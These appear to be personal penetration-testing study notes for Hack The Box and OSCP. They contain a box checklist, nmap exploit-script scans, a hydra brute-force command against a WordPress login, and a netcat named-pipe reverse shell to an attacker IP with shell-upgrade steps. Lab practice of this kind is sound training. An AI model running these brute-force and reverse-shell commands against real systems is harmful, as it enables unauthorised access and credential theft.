# HTB boxes
- [x] Lame
- [x] Beep
- [ ] Bastard
- [ ] Grandpa/Granny
- [x] Mirai
- [x] Solidstate
- [ ] Jeeves
- [ ] Tally (Much harder than anything on OSCP, but you've gotta get used to windows)
- [x] Bashed
- [ ] Nibbles
- [ ] Sense
- [ ] Valentine
- [ ] Bart (Again, same issue but really get used to windows)
- [ ] Chatterbox
- [ ] Popcorn
- [ ] Haircut
- [ ] Nineveh
- [ ] Shocker
- [ ] Cronos
- [ ] Arctic
- [ ] Optimum
- [ ] Davel

nmap -sV --script=exploit,external,vuln,auth,default -oN nmap-version-exploits.txt 10.11.1.220
nmap -sV --reason --dns-server 10.11.1.220 -oN nmap-versions.txt 10.11.1.220

hydra -V -l admin -P /usr/share/wordlists/rockyou.txt 10.11.1.234 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=ERROR" -t 32 -I

nmap -sC -sV -oA
searchsploit -x to view
searchsploit -p copies to clipboard

use burp proxy backwards
- add new proxy listener. then put localhost to a port for the ip you want to inspect. now when you connect to it with the web browser on port 80 you will intercept everything

### getting an actual terminal

`victim$ mknod /tmp/backpipe p`

`victim$ /bin/sh 0</tmp/backpipe | nc 10.10.14.9 445 1>/tmp/backpipe `

to edit the file ^Z to background the shell.

now `stty raw -echo` then `fg` the shell then `reset` (you wont see anything text)
